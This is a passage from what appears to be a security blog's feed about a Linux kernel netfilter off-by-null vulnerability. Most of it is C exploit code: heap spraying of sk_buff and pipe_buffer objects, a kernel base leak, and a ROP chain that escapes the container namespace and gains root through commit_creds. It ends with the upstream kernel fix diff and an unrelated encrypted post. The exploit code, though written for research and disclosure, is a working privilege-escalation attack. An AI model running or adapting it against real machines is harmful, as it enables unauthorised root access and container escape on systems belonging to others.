class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-comment">// release UAF obj as secondary msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] release UAF obj in message queue...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (readMsg(msqid[victim_qid], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>    <br>    <span class="hljs-comment">// spray pipe_buffer</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to create pipe!&quot;</span>);<br>        <br>        <span class="hljs-comment">// write something to activate it</span><br>        <span class="hljs-keyword">if</span> (write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to write the pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// release the sk_buff to read pipe_buffer, leak kernel base</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] release sk_buff to read pipe_buffer...&quot;</span>);<br>    pipe_buf_ptr = (<span class="hljs-keyword">struct</span> pipe_buffer *) &amp;fake_secondary_msg;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (read(sk_sockets[i][<span class="hljs-number">1</span>], &amp;fake_secondary_msg, <br>                    <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>                errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>            <br>            <span class="hljs-keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="hljs-number">0xffffffff81000000</span>)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%llx\n&quot;</span>, <br>                        pipe_buf_ptr-&gt;ops);<br>                kernel_offset = pipe_buf_ptr-&gt;ops - ANON_PIPE_BUF_OPS;<br>                kernel_base = <span class="hljs-number">0xffffffff81000000</span> + kernel_offset;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%llx \033[32m\033[1moffset: \033[0m%llx\n&quot;</span>, <br>            kernel_base, kernel_offset);<br>    <br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.V</span><br><span class="hljs-comment">     * hijack the ops of pipe_buffer</span><br><span class="hljs-comment">     * free all pipe to trigger fake ptr</span><br><span class="hljs-comment">     * so that we hijack the RIP</span><br><span class="hljs-comment">     * construct a ROP on pipe_buffer</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.V hijack the ops of pipe_buffer, gain root privilege\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pre-construct data in userspace...&quot;</span>);<br>    pipe_buf_ptr = (<span class="hljs-keyword">struct</span> pipe_buffer *) fake_secondary_msg;<br>    pipe_buf_ptr-&gt;ops = victim_addr;<br><br>    ops_ptr = (<span class="hljs-keyword">struct</span> pipe_buf_operations *) fake_secondary_msg;<br>    ops_ptr-&gt;release = <span class="hljs-number">0xffffffff8183b4d3</span> + kernel_offset;<span class="hljs-comment">// push rsi ; pop rsp ; add [rbp-0x3d],bl ; ret</span><br>    ops_ptr-&gt;confirm = <span class="hljs-number">0xffffffff81689ea4</span> + kernel_offset;<span class="hljs-comment">// pop rdx ; pop r13 ; pop rbp ; ret</span><br><br>    rop_idx = <span class="hljs-number">0</span>;<br>    rop_chain = (<span class="hljs-type">uint64_t</span>*) &amp;fake_secondary_msg[<span class="hljs-number">0x20</span>];<br>    <span class="hljs-comment">// switch to namespace init_nsproxy</span><br>    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;<br>    rop_chain[rop_idx++] = <span class="hljs-number">1</span>;<br>    rop_chain[rop_idx++] = kernel_offset + FIND_TASK_BY_VPID;<br>    rop_chain[rop_idx++] = kernel_offset + PUSH_RAX_POP_RDI_RET;<br>    rop_chain[rop_idx++] = kernel_offset + POP_RSI_RET;<br>    rop_chain[rop_idx++] = kernel_offset + INIT_PROXY;<br>    rop_chain[rop_idx++] = kernel_offset + SWITCH_TASK_NAMESPACES;<br>    <span class="hljs-comment">// gain root privilege and return to userspace</span><br>    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;<br>    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;<br>    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;<br>    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="hljs-number">22</span>;<br>    rop_chain[rop_idx++] = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[rop_idx++] = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[rop_idx++] = getRootShell;<br>    rop_chain[rop_idx++] = user_cs;<br>    rop_chain[rop_idx++] = user_eflags;<br>    rop_chain[rop_idx++] = user_sp;<br>    rop_chain[rop_idx++] = user_ss;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray sk_buff to hijack pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigger fake ops-&gt;release to hijack RIP...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_NUM; i++)<br>    &#123;<br>        close(pipe_fd[i][<span class="hljs-number">0</span>]);<br>        close(pipe_fd[i][<span class="hljs-number">1</span>]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1>0x03.æ¼æ´ä¿®å¤</h1><p>å†…æ ¸ä¸»çº¿åœ¨ <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=b29c457a6511435960115c0f548c4360d5f4801d">è¿™ä¸ª commit</a> ä¸­å®Œæˆäº†å¯¹è¯¥æ¼æ´çš„ä¿®å¤ï¼Œä¸»è¦å°±æ˜¯<strong>å–æ¶ˆæ‰å¯¹ pad ç½® 0 çš„è¿™ä¸€æ“ä½œ</strong>ï¼Œè€Œæ˜¯é€‰æ‹©åœ¨ <code>translate_compat_table()</code> ä¸­è¿›è¡Œé¢„å…ˆçš„ç½® 0ï¼Œä»è€Œé¿å…äº†ä¸ºäº†å°† pad åŒºåŸŸç½® 0 è€Œå¯¼è‡´çš„å †ä¸Š off-by-nullï¼Œç¬”è€…ä¸ªäººè®¤ä¸ºè¿™ä¸ªæ–¹æ¡ˆè¿˜ç®—æ˜¯æ¯”è¾ƒæˆåŠŸçš„</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/net/ipv4/netfilter/arp_tables.c b/net/ipv4/netfilter/arp_tables.c</span><br><span class="hljs-comment">index 6c26533480dd1..d6d45d820d79a 100644</span><br><span class="hljs-comment">--- a/net/ipv4/netfilter/arp_tables.c</span><br><span class="hljs-comment">+++ b/net/ipv4/netfilter/arp_tables.c</span><br><span class="hljs-meta">@@ -1193,6 +1193,8 @@</span> static int translate_compat_table(struct net *net,<br> if (!newinfo)<br> goto out_unlock;<br> <br><span class="hljs-addition">+memset(newinfo-&gt;entries, 0, size);</span><br><span class="hljs-addition">+</span><br> newinfo-&gt;number = compatr-&gt;num_entries;<br> for (i = 0; i &lt; NF_ARP_NUMHOOKS; i++) &#123;<br> newinfo-&gt;hook_entry[i] = compatr-&gt;hook_entry[i];<br><span class="hljs-comment">diff --git a/net/ipv4/netfilter/ip_tables.c b/net/ipv4/netfilter/ip_tables.c</span><br><span class="hljs-comment">index f15bc21d73016..f77ea0dbe6562 100644</span><br><span class="hljs-comment">--- a/net/ipv4/netfilter/ip_tables.c</span><br><span class="hljs-comment">+++ b/net/ipv4/netfilter/ip_tables.c</span><br><span class="hljs-meta">@@ -1428,6 +1428,8 @@</span> translate_compat_table(struct net *net,<br> if (!newinfo)<br> goto out_unlock;<br> <br><span class="hljs-addition">+memset(newinfo-&gt;entries, 0, size);</span><br><span class="hljs-addition">+</span><br> newinfo-&gt;number = compatr-&gt;num_entries;<br> for (i = 0; i &lt; NF_INET_NUMHOOKS; i++) &#123;<br> newinfo-&gt;hook_entry[i] = compatr-&gt;hook_entry[i];<br><span class="hljs-comment">diff --git a/net/ipv6/netfilter/ip6_tables.c b/net/ipv6/netfilter/ip6_tables.c</span><br><span class="hljs-comment">index 2e2119bfcf137..eb2b5404806c6 100644</span><br><span class="hljs-comment">--- a/net/ipv6/netfilter/ip6_tables.c</span><br><span class="hljs-comment">+++ b/net/ipv6/netfilter/ip6_tables.c</span><br><span class="hljs-meta">@@ -1443,6 +1443,8 @@</span> translate_compat_table(struct net *net,<br> if (!newinfo)<br> goto out_unlock;<br> <br><span class="hljs-addition">+memset(newinfo-&gt;entries, 0, size);</span><br><span class="hljs-addition">+</span><br> newinfo-&gt;number = compatr-&gt;num_entries;<br> for (i = 0; i &lt; NF_INET_NUMHOOKS; i++) &#123;<br> newinfo-&gt;hook_entry[i] = compatr-&gt;hook_entry[i];<br><span class="hljs-comment">diff --git a/net/netfilter/x_tables.c b/net/netfilter/x_tables.c</span><br><span class="hljs-comment">index 6bd31a7a27fc5..92e9d4ebc5e8d 100644</span><br><span class="hljs-comment">--- a/net/netfilter/x_tables.c</span><br><span class="hljs-comment">+++ b/net/netfilter/x_tables.c</span><br><span class="hljs-meta">@@ -733,7 +733,7 @@</span> void xt_compat_match_from_user(struct xt_entry_match *m, void **dstptr,<br> &#123;<br> const struct xt_match *match = m-&gt;u.kernel.match;<br> struct compat_xt_entry_match *cm = (struct compat_xt_entry_match *)m;<br><span class="hljs-deletion">-int pad, off = xt_compat_match_offset(match);</span><br><span class="hljs-addition">+int off = xt_compat_match_offset(match);</span><br> u_int16_t msize = cm-&gt;u.user.match_size;<br> char name[sizeof(m-&gt;u.user.name)];<br> <br><span class="hljs-meta">@@ -743,9 +743,6 @@</span> void xt_compat_match_from_user(struct xt_entry_match *m, void **dstptr,<br> match-&gt;compat_from_user(m-&gt;data, cm-&gt;data);<br> else<br> memcpy(m-&gt;data, cm-&gt;data, msize - sizeof(*cm));<br><span class="hljs-deletion">-pad = XT_ALIGN(match-&gt;matchsize) - match-&gt;matchsize;</span><br><span class="hljs-deletion">-if (pad &gt; 0)</span><br><span class="hljs-deletion">-memset(m-&gt;data + match-&gt;matchsize, 0, pad);</span><br> <br> msize += off;<br> m-&gt;u.user.match_size = msize;<br><span class="hljs-meta">@@ -1116,7 +1113,7 @@</span> void xt_compat_target_from_user(struct xt_entry_target *t, void **dstptr,<br> &#123;<br> const struct xt_target *target = t-&gt;u.kernel.target;<br> struct compat_xt_entry_target *ct = (struct compat_xt_entry_target *)t;<br><span class="hljs-deletion">-int pad, off = xt_compat_target_offset(target);</span><br><span class="hljs-addition">+int off = xt_compat_target_offset(target);</span><br> u_int16_t tsize = ct-&gt;u.user.target_size;<br> char name[sizeof(t-&gt;u.user.name)];<br> <br><span class="hljs-meta">@@ -1126,9 +1123,6 @@</span> void xt_compat_target_from_user(struct xt_entry_target *t, void **dstptr,<br> target-&gt;compat_from_user(t-&gt;data, ct-&gt;data);<br> else<br> memcpy(t-&gt;data, ct-&gt;data, tsize - sizeof(*ct));<br><span class="hljs-deletion">-pad = XT_ALIGN(target-&gt;targetsize) - target-&gt;targetsize;</span><br><span class="hljs-deletion">-if (pad &gt; 0)</span><br><span class="hljs-deletion">-memset(t-&gt;data + target-&gt;targetsize, 0, pad);</span><br> <br> tsize += off;<br> t-&gt;u.user.target_size = tsize;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;s&gt;å–·å­æ°¸è¿œæ˜¯ç‰ˆæœ¬ç­”æ¡ˆ&lt;/s&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/categories/CVE/"/>
    
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/tags/CVE/"/>
    
    <category term="ææƒ" scheme="http://blog.arttnba3.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="å®¹å™¨é€ƒé€¸" scheme="http://blog.arttnba3.cn/tags/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"/>
    
  </entry>
  
  <entry>
    <title>ã€PIECES.0x03ã€‘Shellä¹‹å¤–çš„å¾€äº‹ï¼šä¸€æ¡¶å‡‰æ³¡é¢</title>
    <link href="http://blog.arttnba3.cn/2022/03/18/PIECES-0X03-SHELL_OUTSIDE-3-IDEALIST_DEATH/"/>
    <id>http://blog.arttnba3.cn/2022/03/18/PIECES-0X03-SHELL_OUTSIDE-3-IDEALIST_DEATH/</id>
    <published>2022-03-17T20:14:40.000Z</published>
    <updated>2022-08-18T17:44:41.489Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="é“¾æ¥ï¼šhttps://pan.baidu.com/s/1glFilTF8ua6hI-bklKgJXw æå–ç ï¼šcth0" data-whm="è¿˜è¯·ä¸è¦åšä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„äº‹æƒ…ï¼">  <script id="hbeData" type="hbeData" data-hmacdigest="5a816444af65b5cb990269ea3e666199714b2ce57c60d7d637bc36f624f1b864">eef143a3a3e51e2ee0b1e9c84de8c53cc91e34a664716adcbae4109613b0f512e4f2191695bdd8ebd253d7aea5fb72fb7441e7a0c717919bf2d685be72be9f75be9c0b46ac5c4ed5a3b6a6ea6de06fac4c5edf25ce8e8d006a840896a5cb4f51e5c10715433a90557928dbdaf6aded6e5d7a708487d68815a630a5870ac4c98934c6f24cc516f21d5a35e1b17b092ab65f6c4331d72572635ee97252661aebceb22f24fbe19a171fa90a495a4d3d1195b41b2602385834e289275d9648b0146aa227b58f9e9aa4344bdb3d1e059e671324f966ded030532e22354009e0ce5e8234a10c8aef8c101b930b03afbf9cc0b5a3cc672b359206249ac157983957666168b09532c8e79e9a1db246a5355e40d6f526cd93dec48fe776ffe90e7e06414e91edc121af7d93b27c7d1469c3d21b2a6cd58965b8af51223897d1b1488f85a04932a2806cbdbeec6169cef0edf8df963568b3482898a9bdbd66fdcb4cc943ff9c460f65a7bbe31df6e87849b779bfcd8536e3dfabcf5cdf415eb994b8f2b0b1c17e6fd782a8dbd84447f983b60bfe79442e3308b011a4a1191698595036a94034ca6453ff75fe98593e9ec83ff9c0e252e682a10c9b78831b9a8be0cb6cd28c5d77ee69e7c92b98ca4ab6499d7e1fb345175f77aa15481fe9066198ff7ff7d34ec9c009be4f446ef5df92d62136bf0b8ae969d5e8eda87a50750e4e406c91bb5380a02c25a06634c69abb875d7004bbe0f63377f62bb54aec666e34a1811492d04c134ac9f15d3da2d0e863a59401ddb138e5d46862bccc1440cbccdcc81f0f9fdeac52baf3b5ecc6410345d4f6e29b657e79f80fdc4522c66cf05f1df71357676e60f0132b408b0fcecbb781f3bac599d57c2fbeb5747efb4311990b4bef8e67d66ceb129bb308841b71fac583edb8175a5156412bc2bc78e2fa381cf7e56ecbe6a68361c2efd2a1e5ed3dac91b86061d0e543d63945e89b503bdbe6847f3f9d4e78ea56e8e776b41a1d2a3de6cb81c1022bfc661dfcd109a4359d671a106a057f80502c294cf966e011acf12c371580297359c2ccafe2d84ed42821043ed337fd6517b2a85bfbca80bba04f74dd006fda35b493f36def17a46aa7c5a8112f54167e0f6db97b5fdb775436e174bc470fbd65534cca718b857f2d0f5560d6800321d85b4f9ef595a3eb5d99172f35ab83255a744a041465a91588b55c448171a03fcf5c8847ba36c03f22487dfdc3cee2227869437bbec2696fbd27cdf78afd55c855d1c5e80620d06829d9c01bf95f618d54cab80040ba41e5dd6e99d11df1e4edf35242e899c7cad28b773d08ca5929a64682a896346fb67a3e1cc24be78fde14abb2fe0c9fbb39403b9d1c22f08440a9fa18cea1de270dd344052e2abe77b0aecf13e847567a9c7e6a8e3107838686e54f6ca7f1f7a879663ec60a8772a9ed24fddda6a6d1daf73abb85b84fbf304893434f8f1c8f2835cd973caa894431552ab6bf05962183a3ced903182afa9f901996bc7acf7bfa6c4570683c7a89554e5d2ee9196e63abc6e381e6f60f81dc9d5fe735d1b86f42a96b1546c64072c86f6455db19bb5d87a86a6a76bacc53217d3920fb316e89b40b5053dfbf768548cbf68750be0e0dc3e5b3dc8e43e6e92f2a153df9a6240344550671cd59041a0fb1d9ef339e254196eaf2fb5adf59f0c085a6d38bf0e5555ec006611bb9c8944c12e2b7c5ab7eb04612d7cde5e88899e48c019e1c3e60e201f6408614766579d8ec7b88d9ec679827ca6f0396ca029320be687f835607b61c6bfd5d2fd9f984b00c6a65e5b7812c0b7fe857de8a0ffa6e78c4c95474a9330fe6266616359a9daa5ff2c7e34791a70b0261ac7b62bd254f2f830b3f2183ac169f0a99248932db8ae751d58212187b69109d5c82a4dbe3b4a18832906c37923f7aa61dc069496ae9b6d730c2ec760eb22723e8e4bd9d3f6794715809a33206f3cbc8eedbb8bf2a7a28f5176f3aeaf03ea3865aea881788d8bae009cb453a4f2319b9c02e109116be08140d547928a7ff62b30238110f6ea0c62647d786d089956f762c044433ebbad0a017bcd56da12a30534da4d1877ac10efa89cc53dac73c0d0fd03d304e877688373b8f44cf6c40f93cb7086e0b9e6151982a767449f4fdcc5c9d7976e7be3ced0ac516bdff864ce6d5e40727e38f65b6784432a934f35b3bcd765f2997b9e0c70d1ac025b068b304aa3990f57d894e8c939485452981191c2b1fe4ca2ebb45b7632cfa67d7bffe4584c386dafd95884404666efbd29ab69278e93e84d85fb1da75df515cae0c6ae6fc3b09831fe3be9b91638535db0d29035887d93fb84e702509b917684ef4cdacdad222a3de9f28403f413c53d11340b309347e6f02d53c5d963505596a2b6e1b79f2d411bfd747d221d2d6df785364907ee2d942785748bf6701c6530084e1390e5877424a9a012f1ae410822d3441586c0c6ed4f4b1fd9373630ad8c7c7c0833b154d86f13d7a56188c82d7fb5da8e91fb5e6cee0bcec5988ec05af36fca855d8d6b9a813eef6c7837e87502f3ce2cef3e4e01cf85b24ee538e484678d6d938349521e91307bbcd64375aa017663147ee541b1f236c7d5228275780907590a61789590dcff46a6007fbd6422ed6315667d9a8c40e73a966f60bd49e7062ce81e03946f2c17b958d0a5e2838c1fc5d4cff2892c5e434a7a6141a7ce6feb9665f1a2d70cca5c5e3824fee236acb0b41742661d5d10bb9509a641de74e0142ae259f6ae512abb60e517eda215d34c9e76ec51dd1c01031cfcff8a569c58ed420113501cfecd50cf60f3bdb998d95453b390f72532d78e010b6301053ddbc88664032c9ec63a4359bffaa87dd5943443e12ff92d08b3a082db953e1f4762368c1e7fc3a0fd3bdbbd5d1b3b73da570b7771e684615b196fb3e2e924c79b97e88ad139586cc4c7d9fecb536f82e18bb3eb0fdd3ba692c45520506834a8ead804d449b8bdff734da737efd1f3955e2217c29bba86c7e7f71d3478682c4278a5c78fdc7b61ca9bc6895141ed46c4c138896002019d379bb852f84e66c4c5d030e466bf98e673bda7b0471324e61ce9dda2b4652a9f55614a5edb2e4a550ddc551fcbdfcefefe06ad9f6e8428eeed73800162a9209ec33ce878b8375e8bb8829406e510d32bdb33548b18eca6ed7500a069d454a7878c1ed44254b6f70a2bffb099dcfb38550795f47b0460451d6bb4858385666fefa62b8f79837cebac6f233436e7979df3a1a111011a8a181bbdc8306c536a7639b39b2ecef3c9269b23aad1f7054aa455beded250cb032d08e5a52a29547b1635091bafff15a44c40ca755062dab1c304a3bb2136304c222bd4cb9919e698096b461bd87c2de9b01e2518ce14c1b94b9cd136a66d2f6d9eef14023f1ee1977d16b1c4eb784f5e452e82d5ac0f36332a0a1e0566a2a4019b5cfb141cb3ece073eb89a6d344c91e24a991d4709df4dec332064a992abca890175bc4488b69683db222e3018564b8cc1675b5f10fe06ad923d13e0e28465f17d71d3811931749e5d069f655ce01f9fd2451be30b5fd5e2bcebb2923e81d6189e739b5732b3ff03ddd26dd46706e18a5a7669ba484b4fa336d537792315334baaf6a319ddfa03d0f0077d1f1a8ec3a466e1bd6be585b4248ec603069766a40bea7d16de80d5915a60713aab803eda7817e8d9ecedd3f403e992d4a0ef8453fc18ccf3f679bd44956d70e211d677c57b6cb5b56f154bd7d52d02c57b38cc39a0a49ce2a605ea5102035ad0445231526b219b6688678b1635e6d3392810f3bf975d785e7a2ca28291cdda91a96feeaf88585c1051bc258b49ab877eb4ddaa36c530d3c2dce13aa5090861250a597663bdcb6662fcc84c2c4c27586625752f808df9c38421f55ffb85c34cb8ff537fb2306d02a7338627d5df83541aa8d32baf42c8b09b4125f638db460b05cb915512ba9f1ff9e72228dc850de15366801116078006931c4310d398f5e1a1a0393719cf787fc7b60b9b7ef13b5a912f882a732e9da89ab11bda53e1070cf3987efb3b53afaf1d4d30e82eea1912ffdf0260b95ba0cefdfabc93db9595737c206858f898507fd4338c58a94bb3942757fad71fa2de0b99f28d98cace7e4beca371a0dc12b87fe1eae2c7cc1cee9216f44b83ae6dc9e9f53739091083d8ba06c741160a39a0065c8f9bce119ba35292f2367d8c5fc627b9fb38bc479a5c247daaad13d8af52fe5ff9677f2d6b313a2ab89fdb745f16ae166406182bf892befdb9687d0a12b0fb023726716b082d95ad5786938818ba5c75928ca8fc3a4e2d923a5a69095afabd2240223ec170bc1bc7325516d2df663408d67cd865edf15afb1de97acf04b74591bb3887164d715230ba3fe6046555d03e3d0ebe5ac1c5d065196d029ef7d20f8d973525ffb4d4373f44fe696ae12adcc4d4f0dbb31c7318ad7e62d5e9532e434e034272b68b51b9f36f90ea2089f5f11f34f82a7ecf896b13e6a82b15b6f1333a67d1c37b525489d2918f980a7a68061bb4c7ebcc9cdca0a05cc219a94362fc321c0cf4cdf7f6a13ec4fdca786c8c184c3af5031cde3c3038fe077356655fd522e691a8af65adb290afd5f1d880791679c708e8a36808095a133fc399ff2bfa37fadfa0e1e1d818c3547a412b812bc73ed1e109a1f2e4d016f2818cfd9906518be72f82ba9a3b0641931c10047d546fc3a1c8b36814b54403b94d3c314acacb00cfbe3705e685281e3ae3c44e5237fbb62b228fb5e10e638c3cb42d9757a2625eb9b8a90647353c0ad21d70570b00d35ac4194f81ef9569cf0ef24f57261ea00205c0705d55165bfd4658eeee934f46a37e3d69eabcc7652cb74164016a9c75cf4545e4fc57ad959a971a0f298d51416fdd60e9ee3d97da13ae1bd51da4d033c3d9f99302d6cbd61c52ec2a8f137b207db127ad7d09b94366d05a7f9b292988d583183d1f7f17d7c2015fece0685144c3fd6576e1835236021e72502916bcf7b0cc15d1833a1c9ee1897e6614d63306f9669fd7fb5e6899290544d27cac6c4e9363edefd59120d0a36b7b58574dda1de563e359e34ac8e11794b527ee30f6ae4fbf3c809db8d2e6956672289d4e23a61358245d57003de5e762618d0a879cf38638b7d18dcb68b7890a43e9ccfe6e4175ebcf0e8a1196769a7de0838638698ee662514caab43776878e63159ab4ac1400cbab2267173ab1882c3bc76513f5f6b5686e3f56d4041fa0ba86266fa1b2effc031bc075a98c2e33378b472a028d459ee363be205ffeecca2533eb3626e228a2095ff4dec8d84408192cd952ab3acb035a1454d621f33e1790cba1badb2f086a2388860180f21a870de28a9af48883da4dc65aeb4a155048048fe6d9d3b6648b7a15fca547a3eb84a97aec539932585d0bf2afb50e6e38f21d319f5698d82e02c2af3cfb415a0b548e7ea202e2e1295ec162fdf96175b2845edfa1fe7a791f8fb1dd17fea21d352dab997e6c16d9d87b46f1da6b13dea2f37793d33350ab475c3942db4eb856d47208ee913b4266b98a121bc796341f73d6e22f0c6434b483559c8a4e8e4a4aa872502d5c8d6dcf6945bce542f378741d306feef09e4883073ac1f0946d00178d0b3bef4c73bfd9974485efaa349943e8b02ef5b579105f3b96a200e06902b7cdcc5d62fc52ab8b757203303cd390154c6531c320f3a410adaa7242a97128465e438d303e72f5e69b0c6ed75bd678a50b9a7047ad433e67976c396ce2c4ba4fd0d7fe2dc186a7eff41f6eaa92cabba9fb758219dedb9c8a419136cd1e701ea8af867519319c7aa89a1f9326b22186824a23046d114cf2ee01278019c3d383c315aa7de1a64ca26889d8194880c409bfe586e6375ca771c7d0842cad31fa4b6ec26f5fef73f0bbd551e0ed26ff3d48896f2725a51a56ef09ccc84fbc8593d96adffbf36b0c99e64209b329b19a3a5cf11b7ff4d1520c6220259b6e1e882d93fa305398c97cf697a2412656a321f7a17179bdf402d19bbdecb23c76706b760d2b8ad212574f186149d7911de95436489fbd9004d433529621fc1c3910a4769735b2c034acc8abb8721dcba3b611b0351c739ccaa99fcfae285b1ab37be4f27f4f0dceaf2f067f34f81dc5cae4ea721cf05f901849789131611214615c4b353b11416d94fee1b91a786f3db5568ad85c67a5735d9bef71e2a2a8482b22facf53a95d226c96c998de66e3b5ac8d58f926dcfd4c51288cf0cc6b6bebc0352bb8671d77e60c2455fae9616a3932aa111162b680784745f2eee154cedbcbcd965a77a50017bb37c9449a9b8c1a97deb323ae64ed215cb85e5dfa7d12d2b29ac5c0fd27a3513b0e7bd9535ebd6ec31062da2ea62e0b38cae5f326f5509e9d5fd876b569372350651911d441e8f2ee33ab1cb30f64ecdc4d8e7674bcbe8a08a6c3ab9b095dbaf968ba5e6079116e2af67909aa235fe0fb24c4e4f637ea03fe965035719c21bf24b7c0e836b47261da8808c2a7345a93b604a480f57bb35b2c7e3d102855170adcc72188a5dcb13be83a0ca885328225d419bb3e3667f55c520338a97f2879708e00370d5e8f2d42066405456f7ea1ee4fcd67df1549a7afe5aba83db502900d3c7fb9dab5382bd5b27bf20a2936c1f29557b69586ab6ae9f801a3da2319c2c135df63dbd0844aaf6895d260bf053cc0f5b0fd8081567e985d93c74c2a83c63e7573d07bbd6b734a6a838a20efa8746324610852028c8f1ffc12e737073d48b7925a8261bdd52f0d498a6dc020fdf8269153fa7c703e9e04ecbe0e6ba1a211b8fc1b6bec428abf09e81c2ef572ce43fd4e6d6a755123d7c8863ac45a10b83fe1e844963ef6b1196543ad99a0ab602c92758e9d6665bab13d1d479b3fc3af674f9bea692ba968946b4c5418206c4f9df43d67ccae76afcae728e9cfd778196d61f038eb191009ce34ac4e87c97826d972e5a8e067827d25036023988bb97e